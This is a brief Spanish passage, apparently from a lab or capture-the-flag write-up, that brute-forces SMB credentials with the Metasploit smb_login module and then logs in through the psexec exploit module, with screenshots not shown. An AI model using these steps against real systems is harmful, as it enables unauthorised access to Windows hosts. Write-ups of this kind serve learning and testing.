Utilizamos un ataque de fuerza bruta contra el protocolo smb y obtenemos las credenciales:
```bash
use auxiliary/scanner/smb/smb_login
```

![[Pasted image 20240613011044.png]]

Podemos usar el módulo de psexec para iniciar sesión con dichas credenciales:
```bash
use exploit/windows/smb/psexec
```

![[Pasted image 20240613011051.png]]
